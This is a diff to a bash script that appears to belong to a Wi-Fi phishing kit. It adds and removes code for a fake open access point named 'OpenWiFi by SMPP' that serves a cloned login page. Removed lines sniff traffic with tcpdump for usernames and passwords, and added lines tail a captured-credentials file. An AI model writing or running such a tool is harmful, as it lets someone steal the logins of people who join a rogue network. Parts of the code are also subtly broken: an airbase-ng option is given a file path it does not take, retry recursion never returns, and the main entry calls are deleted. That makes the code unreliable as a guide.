@@ -98,61 +98,50 @@ menu() {
 # Function for captive portal phishing
 captive_portal_phishing() {
     echo "Captive Portal Phishing selected."
+    # Start captive portal phishing
     select_interface
 }
 
-# Function to select network interface
+# Function to select network interface and start monitor mode
 select_interface() {
-    echo "Select network interface:"
-    interfaces=$(ifconfig -a | grep -oE "^[a-zA-Z0-9]+" | grep -v "lo")
-    select interface in $interfaces; do
-        if [ -n "$interface" ]; then
-            echo "Selected interface: $interface"
-            start_captive_portal "$interface"
-            break
-        else
-            echo "Invalid selection. Please try again."
-        fi
-    done
+    echo "Enter the network interface you want to use (e.g., wlan0):"
+    read -p "Interface: " interface
+    if [ -z "$interface" ]; then
+        echo "Interface not specified. Please try again."
+        select_interface
+    fi
+
+    # Check if the interface exists
+    if ! ifconfig "$interface" &>/dev/null; then
+        echo "Interface $interface not found. Please try again."
+        select_interface
+    fi
+
+    echo "Selected interface: $interface"
+    start_monitor_mode "$interface"
 }
 
-# Function to start captive portal phishing
-start_captive_portal() {
+# Function to start monitor mode on the specified interface
+start_monitor_mode() {
     interface=$1
-    echo "Starting captive portal phishing on interface: $interface"
-    # Set interface to monitor mode
-    airmon-ng start $interface
-    # Start fake AP
-    airbase-ng -a AA:BB:CC:DD:EE:FF -e "OpenWiFi by SMPP" -c 6 $interface &
-    sleep 5 # Wait for AP to start
-    serve_login_page "$interface" &
-    capture_credentials "$interface"
+    echo "Putting $interface in monitor mode..."
+    airmon-ng start "$interface"
+    start_fake_ap "$interface"
 }
 
-# Function to serve login page
-serve_login_page() {
+# Function to start fake AP with captive portal
+start_fake_ap() {
     interface=$1
-    echo "Serving login page on interface: $interface"
-    cd $SITES_DIR/$server
-    while true; do
-        python3 -m http.server 80 > /dev/null 2>&1
-    done
+    echo "Starting fake access point with captive portal on interface $interface..."
+    # Get the selected server's login page
+    server_login_page=$(ls ./sites/"$server"/login.*)
+
+    # Start fake AP with the selected server's login page
+    gnome-terminal -- airbase-ng -a AA:BB:CC:DD:EE:FF -e "OpenWiFi by SMPP" -c 6 -P "$server_login_page" "$interface" &
 }
 
-# Function to capture credentials
-capture_credentials() {
-    interface=$1
-    echo "Capturing credentials on interface: $interface"
-    tcpdump -i $interface -A dst port 80 or dst port 443 | grep -i "username\|password" >> $SCRIPT_DIR/captured_credentials.txt
+# Function to continuously display captured credentials
+display_creds() {
+    echo "Waiting for credentials..."
+    tail -f creds.txt
 }
-
-# Main script starts here
-
-# Clear the terminal
-clear_terminal
-
-# Display the big welcome message
-big_welcome
-
-# Call the menu function to start
-menu
